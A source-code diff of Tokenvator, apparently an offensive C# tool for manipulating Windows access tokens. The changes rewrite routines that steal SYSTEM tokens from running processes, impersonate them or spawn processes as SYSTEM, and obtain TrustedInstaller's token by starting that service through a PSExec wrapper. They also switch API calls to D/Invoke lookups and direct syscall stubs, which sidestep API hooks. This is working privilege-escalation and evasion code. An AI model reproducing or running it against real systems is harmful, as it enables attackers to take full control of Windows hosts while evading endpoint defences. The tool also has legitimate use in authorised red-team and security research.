@@ -1,222 +1,116 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Diagnostics;
+using System.Runtime.ExceptionServices;
 using System.Runtime.InteropServices;
+using System.Security;
 using System.Security.Principal;
-using System.Text;
+
+using DInvoke.DynamicInvoke;
 
 using Tokenvator.Resources;
 using Tokenvator.Plugins.Enumeration;
 using Tokenvator.Plugins.Execution;
 
-
 using MonkeyWorks.Unmanaged.Headers;
-using MonkeyWorks.Unmanaged.Libraries;
+//using MonkeyWorks.Unmanaged.Libraries;
 
 namespace Tokenvator.Plugins.AccessTokens
 {
+    using MonkeyWorks = MonkeyWorks.Unmanaged.Libraries.DInvoke;
+
     partial class TokenManipulation : AccessTokens
     {
-        private Dictionary<uint, string> processes;
-
-        public static List<string> validPrivileges = new List<string> { "SeAssignPrimaryTokenPrivilege",
-            "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
-            "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege",
-            "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeEnableDelegationPrivilege",
-            "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege",
-            "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege",
-            "SeMachineAccountPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege",
-            "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege",
-            "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege",
-            "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege",
-            "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
-            "SeUndockPrivilege", "SeUnsolicitedInputPrivilege" };
+        private const string TRUSTED_INSTALLER = "TrustedInstaller";
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Default Constructor
+        /// <summary>
+        /// Default Constructor
+        /// </summary>
+        /// <param name="currentProcessToken"></param>
         ////////////////////////////////////////////////////////////////////////////////
         internal TokenManipulation(IntPtr currentProcessToken) : base(currentProcessToken)
         {
-            processes = new Dictionary<uint, string>();
+
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // IDisposable
+        /// <summary>
+        /// Default Constructor
+        /// </summary>
+        /// <param name="currentProcessToken"></param>
         ////////////////////////////////////////////////////////////////////////////////
-        public new void Dispose()
+        internal TokenManipulation() : base()
+        {
+
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// IDisposable to free the allocated pointers
+        /// </summary>
+        ////////////////////////////////////////////////////////////////////////////////
+        public override void Dispose()
         {
             base.Dispose();
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Default Destructor
+        /// <summary>
+        /// Default destructor
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
         ~TokenManipulation()
         {
             Dispose();
         }
 
-        ////////////////////////////////////////////////////////////////////////////////
-        // Assigns a token to a process
-        ////////////////////////////////////////////////////////////////////////////////
-        public bool AssignPrimaryToken()
-        {
-            ntdll._PROCESS_ACCESS_TOKEN processAccessToken = new ntdll._PROCESS_ACCESS_TOKEN
-            {
-                hToken = phNewToken,
-                hThread = IntPtr.Zero
-            };
-
-            uint status = ntdll.NtSetInformationProcess(
-                kernel32.GetCurrentProcess(),
-                ntdll._PROCESS_INFORMATION_CLASS.ProcessAccessToken,
-                ref processAccessToken,
-                (uint)Marshal.SizeOf(typeof(ntdll._PROCESS_ACCESS_TOKEN))
-            );
-
-            if (0 != status)
-            {
-                Misc.GetNtError("NtSetInformationProcess", status);
-                Console.WriteLine("[*] Is SeAssignPrimaryTokenPrivilege Enabled?");
-                return false;
-            }
-            Console.WriteLine("[+] Primary Token Assigned");
-
-            return true;
-        }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Prints the tokens privileges
-        ////////////////////////////////////////////////////////////////////////////////
-        public void DisableAndRemoveAllTokenPrivileges()
-        {
-            ////////////////////////////////////////////////////////////////////////////////
-            Console.WriteLine("[*] Enumerating Token Privileges");
-            uint TokenInfLength = 0;
-            advapi32.GetTokenInformation(hExistingToken, Winnt._TOKEN_INFORMATION_CLASS.TokenPrivileges, IntPtr.Zero, 0, out TokenInfLength);
-
-            if (TokenInfLength < 0 || TokenInfLength > int.MaxValue)
-            {
-                Misc.GetWin32Error("GetTokenInformation - 1 " + TokenInfLength);
-                return;
-            }
-            Console.WriteLine("[*] GetTokenInformation - Pass 1");
-            IntPtr lpTokenInformation = Marshal.AllocHGlobal((int)TokenInfLength);
-
-            ////////////////////////////////////////////////////////////////////////////////
-            if (!advapi32.GetTokenInformation(hExistingToken, Winnt._TOKEN_INFORMATION_CLASS.TokenPrivileges, lpTokenInformation, TokenInfLength, out TokenInfLength))
-            {
-                Misc.GetWin32Error("GetTokenInformation - 2 " + TokenInfLength);
-                return;
-            }
-            Console.WriteLine("[*] GetTokenInformation - Pass 2");
-            Winnt._TOKEN_PRIVILEGES_ARRAY tokenPrivileges = (Winnt._TOKEN_PRIVILEGES_ARRAY)Marshal.PtrToStructure(lpTokenInformation, typeof(Winnt._TOKEN_PRIVILEGES_ARRAY));
-            Marshal.FreeHGlobal(lpTokenInformation);
-            Console.WriteLine("[+] Enumerated {0} Privileges", tokenPrivileges.PrivilegeCount);
-            Console.WriteLine();
-            Console.WriteLine("{0,-45}{1,-30}", "Privilege Name", "Enabled");
-            Console.WriteLine("{0,-45}{1,-30}", "--------------", "-------");
-            ////////////////////////////////////////////////////////////////////////////////
-            for (int i = 0; i < tokenPrivileges.PrivilegeCount; i++)
-            {
-                StringBuilder lpName = new StringBuilder();
-                int cchName = 0;
-                IntPtr lpLuid = Marshal.AllocHGlobal(Marshal.SizeOf(tokenPrivileges.Privileges[i]));
-                Marshal.StructureToPtr(tokenPrivileges.Privileges[i].Luid, lpLuid, true);
-
-                advapi32.LookupPrivilegeName(null, lpLuid, null, ref cchName);
-                if (cchName <= 0 || cchName > int.MaxValue)
-                {
-                    Misc.GetWin32Error("LookupPrivilegeName Pass 1");
-                    Marshal.FreeHGlobal(lpLuid);
-                    continue;
-                }
-
-                lpName.EnsureCapacity(cchName + 1);
-                if (!advapi32.LookupPrivilegeName(null, lpLuid, lpName, ref cchName))
-                {
-                    Misc.GetWin32Error("LookupPrivilegeName Pass 2");
-                    Marshal.FreeHGlobal(lpLuid);
-                    continue;
-                }
-
-                Winnt._PRIVILEGE_SET privilegeSet = new Winnt._PRIVILEGE_SET
-                {
-                    PrivilegeCount = 1,
-                    Control = Winnt.PRIVILEGE_SET_ALL_NECESSARY,
-                    Privilege = new Winnt._LUID_AND_ATTRIBUTES[] { tokenPrivileges.Privileges[i] }
-                };
-
-                int pfResult = 0;
-                if (!advapi32.PrivilegeCheck(hExistingToken, ref privilegeSet, out pfResult))
-                {
-                    Misc.GetWin32Error("PrivilegeCheck");
-                    Marshal.FreeHGlobal(lpLuid);
-                    continue;
-                }
-                if (Convert.ToBoolean(pfResult))
-                {
-                    SetTokenPrivilege(lpName.ToString(), Winnt.TokenPrivileges.SE_PRIVILEGE_NONE);
-                }
-                SetTokenPrivilege(lpName.ToString(), Winnt.TokenPrivileges.SE_PRIVILEGE_REMOVED);
-                Marshal.FreeHGlobal(lpLuid);
-            }
-            Console.WriteLine();
-        }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
-        public bool DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL impersonationLevel)
-        {
-            if (IntPtr.Zero == hExistingToken)
-                return false;
-
-            Winbase._SECURITY_ATTRIBUTES securityAttributes = new Winbase._SECURITY_ATTRIBUTES();
-            if (!advapi32.DuplicateTokenEx(
-                        hWorkingToken,
-                        (uint)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED,
-                        ref securityAttributes,
-                        impersonationLevel,
-                        Winnt._TOKEN_TYPE.TokenImpersonation,
-                        out phNewToken
-            ))
-            {
-                Misc.GetWin32Error("DuplicateTokenEx: ");
-                return false;
-            }
-
-            Console.WriteLine(" [+] Duplicate Token Handle: 0x{0}", phNewToken.ToString("X4"));
-            return true;
-        }
-
         #region Privilege Escalations
         ////////////////////////////////////////////////////////////////////////////////
-        // Creates a new process as SYSTEM
+        /// <summary>
+        /// Starts a process with a duplicated SYSTEM Token
+        /// No conversions required
+        /// Removed references to UserSessions
+        /// </summary>
+        /// <returns>Returns true if process was successfully started</returns>
         ////////////////////////////////////////////////////////////////////////////////
         public bool GetSystem(string newProcess)
         {
-            SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
-            NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));
-
-            Console.WriteLine("[*] Searching for {0}", systemAccount.ToString());
-            processes = UserSessions.EnumerateUserProcesses(false, systemAccount.ToString());
-
-            foreach (uint process in processes.Keys)
+            try
             {
-                if (OpenProcessToken((int)process))
+                SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
+                NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));
+
+                Console.WriteLine("[*] Searching for {0}", systemAccount.ToString());
+                using (TokenInformation ti = new TokenInformation(IntPtr.Zero))
                 {
-                    Console.WriteLine(" [+] Opened {0}", process);
-                    SetWorkingTokenToRemote();
-                    if (DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
+                    foreach (Process p in Process.GetProcesses())
                     {
-                        SetWorkingTokenToNewToken();
-                        if (StartProcessAsUser(newProcess))
+                        ti.OpenProcessToken(p.Id, false);
+                        ti.SetWorkingTokenToRemote();
+                        string userName = ti.GetTokenUser(false);
+                        if (userName.Contains(systemAccount.ToString(), StringComparison.OrdinalIgnoreCase))
                         {
-                            return true;
+                            hExistingToken = ti.GetWorkingToken();
+
+                            SetWorkingTokenToRemote();
+                            if (!DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, Winnt._TOKEN_TYPE.TokenPrimary))
+                            {
+                                continue;
+                            }
+
+                            SetWorkingTokenToNewToken();
+                            if (StartProcessAsUser(newProcess))
+                            {
+                                return true;
+                            }
                         }
                     }
                 }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                return false;
             }
 
             Misc.GetWin32Error("GetSystem");
@@ -224,55 +118,99 @@ namespace Tokenvator.Plugins.AccessTokens
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Elevates current process to SYSTEM
+        /// <summary>
+        /// Impersonates a SYSTEM Token
+        /// No conversions required
+        /// </summary>
+        /// <returns>Returns true if impersonated successfullly</returns>
         ////////////////////////////////////////////////////////////////////////////////
         public bool GetSystem()
         {
-            SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
-            NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));
-
-            Console.WriteLine("[*] Searching for {0}", systemAccount.ToString());
-            processes = UserSessions.EnumerateUserProcesses(false, systemAccount.ToString());
-
-            foreach (uint process in processes.Keys)
+            try
             {
-                if (OpenProcessToken((int)process))
+                SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
+                NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));
+
+                Console.WriteLine("[*] Searching for {0}", systemAccount.ToString());
+                using (TokenInformation ti = new TokenInformation(IntPtr.Zero))
                 {
-                    Console.WriteLine(" [+] Opened {0}", process);
-                    SetWorkingTokenToRemote();
-                    if (ImpersonateUser())
+                    foreach (Process p in Process.GetProcesses())
                     {
-                        return true;
+                        ti.OpenProcessToken(p.Id, false);
+                        ti.SetWorkingTokenToRemote();
+                        string userName = ti.GetTokenUser(false);
+                        if (userName.Contains(systemAccount.ToString(), StringComparison.OrdinalIgnoreCase))
+                        {
+                            hExistingToken = ti.GetWorkingToken();
+                            SetWorkingTokenToRemote();
+
+                            if (ImpersonateUser())
+                            {
+                                return true;
+                            }
+                        }
                     }
                 }
             }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                return false;
+            }
+
             return false;
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Creates a process as SYSTEM w/ Trusted Installer Group
+        /// <summary>
+        /// Impersonates a SYSTEM token w/ Trusted Installer Group by starting  
+        /// the TrustedInstaller service and starting a process with it's token
+        /// No conversions required
+        /// </summary>
+        /// <returns>Returns true if process was successfully started</returns>
         ////////////////////////////////////////////////////////////////////////////////
         public bool GetTrustedInstaller(string newProcess)
         {
+            const string TRUSTED_INSTALLER = "TrustedInstaller";
+
             Console.WriteLine("[+] Getting NT AUTHORITY\\SYSTEM privileges");
+            //This is required for duplicate token
             GetSystem();
             Console.WriteLine(" [*] Running as: {0}", WindowsIdentity.GetCurrent().Name);
 
+            /*
             Services services = new Services("TrustedInstaller");
             if (!services.StartService())
             {
                 Misc.GetWin32Error("StartService");
                 return false;
             }
+            */
 
-            if (!OpenProcessToken((int)services.GetServiceProcessId()))
+            using (PSExec psexec = new PSExec(TRUSTED_INSTALLER))
             {
-                Misc.GetWin32Error("GetPrimaryToken");
+                if (!psexec.Connect("."))
+                {
+                    return false;
+                }
+                if (!psexec.Open())
+                {
+                    return false;
+                }
+                if (!psexec.Start())
+                {
+                    return false;
+                }
+            }
+
+            if (!OpenProcessToken((int)Misc.GetProcessId(TRUSTED_INSTALLER)))
+            {
+                Misc.GetWin32Error("OpenProcessToken");
                 return false;
             }
 
             SetWorkingTokenToRemote();
-            if (!DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
+            if (!DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, Winnt._TOKEN_TYPE.TokenPrimary))
             {
                 Misc.GetWin32Error("DuplicateToken");
                 return false;
@@ -281,7 +219,7 @@ namespace Tokenvator.Plugins.AccessTokens
             SetWorkingTokenToNewToken();
             if (!StartProcessAsUser(newProcess))
             {
-                Misc.GetWin32Error("DuplicateToken");
+                Misc.GetWin32Error("StartProcessAsUser");
                 return false;
             }
 
@@ -289,7 +227,12 @@ namespace Tokenvator.Plugins.AccessTokens
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Elevates current process to SYSTEM w/ Trusted Installer Group
+        /// <summary>
+        /// Impersonates a SYSTEM token w/ Trusted Installer Group by starting  
+        /// the TrustedInstaller service and stealing it token
+        /// No conversions required
+        /// </summary>
+        /// <returns>Returns true if impersonated successfullly</returns>
         ////////////////////////////////////////////////////////////////////////////////
         public bool GetTrustedInstaller()
         {
@@ -297,252 +240,181 @@ namespace Tokenvator.Plugins.AccessTokens
             GetSystem();
             Console.WriteLine(" [+] Running as: {0}", WindowsIdentity.GetCurrent().Name);
 
+            /*
             Services services = new Services("TrustedInstaller");
             if (!services.StartService())
             {
                 Misc.GetWin32Error("StartService");
                 return false;
             }
+            */
 
-            if (OpenProcessToken((int)services.GetServiceProcessId()))
+            using (PSExec psexec = new PSExec(TRUSTED_INSTALLER))
             {
-                SetWorkingTokenToRemote();
-                if (ImpersonateUser())
+                if (!psexec.Connect("."))
                 {
-                    return true;
+                    return false;
+                }
+                if (!psexec.Open())
+                {
+                    return false;
+                }
+                if (!psexec.Start())
+                {
+                    return false;
                 }
             }
 
-            return false;
+            if (!OpenProcessToken((int)Misc.GetProcessId(TRUSTED_INSTALLER)))
+            {
+                return false;
+            }
+
+            SetWorkingTokenToRemote();
+            if (!ImpersonateUser())
+            {
+                return false;
+            }
+
+            return true;
         }
         #endregion
 
+        #region Alter Privileges
         ////////////////////////////////////////////////////////////////////////////////
-        // 
+        /// <summary>
+        /// Can be use to remove groups, adding groups would require a new token
+        /// Removing groups would require creating a restricted token
+        /// https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokengroups
+        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress
+        /// </summary>
+        /// <param name="group"></param>
         ////////////////////////////////////////////////////////////////////////////////
-        public void LogonUser(string domain, string username, string password, Winbase.LOGON_TYPE logonType, string command, string arguments)
+        [SecurityCritical]
+        [HandleProcessCorruptedStateExceptions]
+        public void DisableTokenGroup(string group)
         {
-            if (!advapi32.LogonUser(username, domain, password, logonType, Winbase.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT, out hExistingToken))
-            {
-                Misc.GetWin32Error("LogonUser");
-                return;
-            }
-            Console.WriteLine("[+] Logged On {0}", username.TrimEnd());
-
-            if (Winbase.LOGON_TYPE.LOGON32_LOGON_SERVICE == logonType)
-            {
-                if (!SetTokenSessionId(Process.GetCurrentProcess().SessionId))
-                {
-                    Console.WriteLine(" [-] Unable to Update Token Session ID, this is likely to cause problems with this token");
-                }
-            }
-
-            if (string.IsNullOrEmpty(command))
-            {
-                SetWorkingTokenToRemote();
-                ImpersonateUser();
-            }
-            else
-            {
-                Create createProcess;
-                if (0 == Process.GetCurrentProcess().SessionId)
-                    createProcess = CreateProcess.CreateProcessWithLogonW;
-                else
-                    createProcess = CreateProcess.CreateProcessWithTokenW;
-
-                createProcess(hExistingToken, command, arguments);
-            }
-        }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // 
-        ////////////////////////////////////////////////////////////////////////////////
-        public void LogonUser(string domain, string username, string password, string groups, Winbase.LOGON_TYPE logonType, string command, string arguments)
-        {
-            SetWorkingTokenToSelf();
-            CreateTokens ct = new CreateTokens(hWorkingToken);
-            Ntifs._TOKEN_GROUPS tokenGroups;
-            Winnt._TOKEN_PRIMARY_GROUP tokenPrimaryGroup;
-            ct.CreateTokenGroups(domain, username, out tokenGroups, out tokenPrimaryGroup, groups.Split(','));
-            /*
             TokenInformation ti = new TokenInformation(hWorkingToken);
             ti.GetTokenGroups();
-            Ntifs._TOKEN_GROUPS tokenGroups = ti.tokenGroups;
             
-            int extraGroups = tokenGroups.GroupCount;
+            IntPtr hNtAdjustGroupsToken = Generic.GetSyscallStub("NtAdjustGroupsToken");
+            MonkeyWorks.ntdll.NtAdjustGroupsToken fSyscallNtAdjustGroupsToken = (MonkeyWorks.ntdll.NtAdjustGroupsToken)Marshal.GetDelegateForFunctionPointer(hNtAdjustGroupsToken, typeof(MonkeyWorks.ntdll.NtAdjustGroupsToken));
 
-            uint groupsAttributes = (uint)(Winnt.SE_GROUP_ENABLED | Winnt.SE_GROUP_ENABLED_BY_DEFAULT | Winnt.SE_GROUP_MANDATORY);
-
-            Ntifs._TOKEN_GROUPS tokenGroupsCopy = new Ntifs._TOKEN_GROUPS();
-            tokenGroupsCopy.Initialize();
-
-            for (int i = 0; i < tokenGroups.GroupCount; i++)
+            string sid, account;
+            for (int i = 0; i < ti.tokenGroups.GroupCount; i++) 
             {
-                tokenGroupsCopy.Groups[i] = tokenGroups.Groups[i];
-            }
-
-            foreach (string group in groups.Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries))
-            {
-                Console.WriteLine(group);
-                string d = Environment.MachineName;
-                string groupname = group;
-                if (group.Contains(@"\"))
+                ti.ReadSidAndName(ti.tokenGroups.Groups[i].Sid, out sid, out account);
+                if (string.Equals(group, account, StringComparison.OrdinalIgnoreCase))
                 {
-                    string[] split = group.Split('\\');
-                    d = split[0];
-                    groupname = split[1];
-                }
-                Console.WriteLine(groupname);
-                string sid = new NTAccount(d, groupname).Translate(typeof(SecurityIdentifier)).Value;
-                Console.WriteLine(sid);
-                tokenGroupsCopy.Groups[++extraGroups].Sid = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
-                Console.WriteLine(extraGroups);
-                CreateTokens.InitializeSid(sid, ref tokenGroupsCopy.Groups[extraGroups].Sid);
-                tokenGroupsCopy.Groups[extraGroups].Attributes = groupsAttributes;
-            }
-            tokenGroupsCopy.GroupCount = extraGroups;
-            */
-
-            if (!advapi32.LogonUserExExW(
-                username, domain, password, 
-                logonType, Winbase.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT, 
-                ref tokenGroups, out hExistingToken, 
-                IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
-            {
-                Misc.GetWin32Error("LogonUserExExW");
-                return;
-            }
-            Console.WriteLine("[+] Logged On {0}", username.TrimEnd());
-
-            if (Winbase.LOGON_TYPE.LOGON32_LOGON_SERVICE == logonType)
-            {
-                SetWorkingTokenToRemote();
-                if (!SetTokenSessionId(Process.GetCurrentProcess().SessionId))
-                {
-                    Console.WriteLine(" [-] Unable to Update Token Session ID, this is likely to cause problems with this token");
+                    ti.tokenGroups.Groups[i].Attributes ^= (uint)Winnt.SE_GROUP_ENABLED;
+                    break;
                 }
             }
 
-            if (string.IsNullOrEmpty(command))
+            ulong groupSize = (ulong)Marshal.SizeOf(ti.tokenGroups);
+
+            uint ntRetVal = 0;
+            try
             {
-                SetWorkingTokenToRemote();
-                ImpersonateUser();
+                ntRetVal = fSyscallNtAdjustGroupsToken(hWorkingToken, false, ref ti.tokenGroups, groupSize, ref ti.tokenGroups, ref groupSize);
             }
-            else
+            catch (Exception ex)
             {
-                Create createProcess;
-                if (0 == Process.GetCurrentProcess().SessionId)
-                    createProcess = CreateProcess.CreateProcessWithLogonW;
-                else
-                    createProcess = CreateProcess.CreateProcessWithTokenW;
-
-                createProcess(hExistingToken, command, arguments);
-            }
-        }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Can be use to remove groups, adding groups would require a new token 
-        // Next Release
-        //https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokengroups
-        ////////////////////////////////////////////////////////////////////////////////
-        public void SetTokenGroup(string group, bool isSID)
-        {
-            var tokenGroups = new Ntifs._TOKEN_GROUPS();
-            tokenGroups.Initialize();
-
-            if (!DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
-            {
-                return;
-            }
-            SetWorkingTokenToNewToken();
-
-            TokenInformation ti = new TokenInformation(hWorkingToken);
-            ti.GetTokenGroups();
-            for (int i = 0; i < ti.tokenGroups.GroupCount; i++)
-            {
-                tokenGroups.Groups[i].Sid = ti.tokenGroups.Groups[i].Sid;
-                tokenGroups.Groups[i].Attributes = ti.tokenGroups.Groups[i].Attributes;
-                Console.WriteLine(tokenGroups.Groups[i].Sid);
-            }
-            tokenGroups.GroupCount = ti.tokenGroups.GroupCount;
-
-            if (!isSID)
-            {
-                Console.WriteLine("Group:     {0}", group);
-                string domain = Environment.MachineName;
-                if (group.Contains(@"\"))
-                {
-                    string[] split = group.Split('\\');
-                    domain = split[0];
-                    group = split[1];
-                }
-                group = new NTAccount(domain, group).Translate(typeof(SecurityIdentifier)).Value;
-            }
-            Console.WriteLine("Group SID: {0}", group);
-            ++tokenGroups.GroupCount;
-
-            if (!CreateTokens.InitializeSid("S-1-5-21-258464558-1780981397-2849438727-1010", ref tokenGroups.Groups[tokenGroups.GroupCount].Sid))
-            {
-                return;
-            }
-            tokenGroups.Groups[tokenGroups.GroupCount].Attributes = (uint)Winnt.SE_GROUP_ENABLED;
-            CreateTokens ct = new CreateTokens(hWorkingToken);
-
-            string userName = WindowsIdentity.GetCurrent().Name;
-            userName = userName.Split('\\')[1];
-
-            //ct.CreateTokenGroups(userName, out Ntifs._TOKEN_GROUPS tg, out Winnt._TOKEN_PRIMARY_GROUP tpg);
-
-            tokenGroups = ti.tokenGroups;
-
-            uint returnLength;
-            if (!advapi32.AdjustTokenGroups(hWorkingToken, false, ref tokenGroups, (uint)Marshal.SizeOf(tokenGroups), ref ti.tokenGroups, out returnLength))
-            {
-                Misc.GetWin32Error("AdjustTokenGroups");
+                Console.WriteLine("[-] NtAdjustGroupsToken Generated an Exception");
+                Console.WriteLine("[-] {0}", ex.Message);
                 return;
             }
 
-            ti.GetTokenGroups();
+            Console.WriteLine("[*] Group no longer enabled");
 
-            Console.WriteLine(returnLength);
-
+            if (0 != ntRetVal)
+            {
+                Misc.GetNtError("NtAdjustGroupsToken", ntRetVal);
+                return;
+            }
 
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // 
+        /// <summary>
+        /// Updates a privilege on an impersonation / thread token
+        /// No Conversions Required
+        /// </summary>
+        /// <param name="privilege"></param>
+        /// <param name="attribute"></param>
         ////////////////////////////////////////////////////////////////////////////////
         public void SetThreadTokenPrivilege(string privilege, Winnt.TokenPrivileges attribute)
         {
             foreach (uint t in threads)
             {
                 Console.WriteLine("[*] Thread ID: " + t);
-                if (OpenThreadToken(t, Winnt.TOKEN_ALL_ACCESS))
+                if (!OpenThreadToken(t, Winnt.TOKEN_ALL_ACCESS))
                 {
-                    SetWorkingTokenToThreadToken();
-                    SetTokenPrivilege(privilege, attribute);
+                    continue;
                 }
+
+                SetWorkingTokenToThreadToken();
+                SetTokenPrivilege(privilege, attribute);
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Sets a Token to have a specified privilege
-        // http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
-        // https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
+        /// <summary>
+        /// Adjusts the state of a privilege on a Token
+        /// http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
+        /// https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
+        /// Converted to a mix of D/Invoke Syscalls and GetPebLdrModuleEntry/GetExportAddress
+        /// </summary>
+        /// <param name="privilege"></param>
+        /// <param name="attribute"></param>
+        /// <returns></returns>
         ////////////////////////////////////////////////////////////////////////////////
+        [SecurityCritical]
+        [HandleProcessCorruptedStateExceptions]
         public bool SetTokenPrivilege(string privilege, Winnt.TokenPrivileges attribute)
         {
             Console.WriteLine("[*] Adjusting Token Privilege {0} => {1}", privilege, attribute);
+
             ////////////////////////////////////////////////////////////////////////////////
+            // Retrieves the LUID for the name of a specified privilege
+            // advapi32.LookupPrivilegeValue(null, privilege, ref luid)
+            ////////////////////////////////////////////////////////////////////////////////
+            
+            #region LookupPrivilegeValueW
             Winnt._LUID luid = new Winnt._LUID();
-            if (!advapi32.LookupPrivilegeValue(null, privilege, ref luid))
+
+            IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");
+            IntPtr hLookupPrivilegeValueW = Generic.GetExportAddress(hadvapi32, "LookupPrivilegeValueW");
+            MonkeyWorks.advapi32.LookupPrivilegeValueW fLookupPrivilegeValueW = (MonkeyWorks.advapi32.LookupPrivilegeValueW)Marshal.GetDelegateForFunctionPointer(hLookupPrivilegeValueW, typeof(MonkeyWorks.advapi32.LookupPrivilegeValueW));
+
+            bool retVal = false;
+            try
             {
-                Misc.GetWin32Error("LookupPrivilegeValue");
+                retVal = fLookupPrivilegeValueW(string.Empty, privilege, ref luid);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] LookupPrivilegeValueW Generated an Exception");
+                Console.WriteLine("[-] {0}", ex.Message);
+                return false;
+            }
+
+            if (!retVal)
+            {
+                Misc.GetWin32Error("LookupPrivilegeValueW");
                 return false;
             }
             Console.WriteLine(" [+] Recieved luid");
+            #endregion
 
             ////////////////////////////////////////////////////////////////////////////////
+            // Adjust the token privileges to hWorkingToken
+            // advapi32.AdjustTokenPrivileges(hWorkingToken, false, ref newState, (uint)Marshal.SizeOf(newState), ref previousState, out returnLength)
+            ////////////////////////////////////////////////////////////////////////////////
+
+            #region AdjustTokenPrivilege
+            Console.WriteLine(" [*] AdjustTokenPrivilege");
+
             Winnt._LUID_AND_ATTRIBUTES luidAndAttributes = new Winnt._LUID_AND_ATTRIBUTES
             {
                 Luid = luid,
@@ -554,68 +426,63 @@ namespace Tokenvator.Plugins.AccessTokens
                 Privileges = luidAndAttributes
             };
             Winnt._TOKEN_PRIVILEGES previousState = new Winnt._TOKEN_PRIVILEGES();
-            Console.WriteLine(" [*] AdjustTokenPrivilege");
-            uint returnLength;
-            if (!advapi32.AdjustTokenPrivileges(hWorkingToken, false, ref newState, (uint)Marshal.SizeOf(newState), ref previousState, out returnLength))
+            
+            ulong returnLength = 0;
+
+            IntPtr hNtAdjustPrivilegesToken = Generic.GetSyscallStub("NtAdjustPrivilegesToken");
+            MonkeyWorks.ntdll.NtAdjustPrivilegesToken fSyscallNtAdjustPrivilegesToken = (MonkeyWorks.ntdll.NtAdjustPrivilegesToken)Marshal.GetDelegateForFunctionPointer(hNtAdjustPrivilegesToken, typeof(MonkeyWorks.ntdll.NtAdjustPrivilegesToken));
+
+            uint ntRetVal = 0;
+            try
             {
-                Misc.GetWin32Error("AdjustTokenPrivileges");
+                ntRetVal = fSyscallNtAdjustPrivilegesToken(hWorkingToken, false, ref newState, (uint)Marshal.SizeOf(newState), ref previousState, ref returnLength);
+            }
+            catch(Exception ex)
+            {
+                Console.WriteLine("[-] NtAdjustPrivilegesToken Generated an Exception");
+                Console.WriteLine("[-] {0}", ex.Message);
                 return false;
             }
+
+            if (0 != ntRetVal)
+            {
+                Misc.GetNtError("NtAdjustPrivilegesToken", ntRetVal);
+                return false;
+            }
+            #endregion
 
             Console.WriteLine(" [+] Adjusted Privilege: {0}", privilege);
             Console.WriteLine(" [+] Privilege State: {0}", attribute);
             return true;
         }
+        #endregion
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Updates the token session ID to the specified session
+        /// <summary>
+        /// Removes the thread token, causing the process to execute with the process 
+        /// token.
+        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress
+        /// </summary>
+        /// <returns></returns>
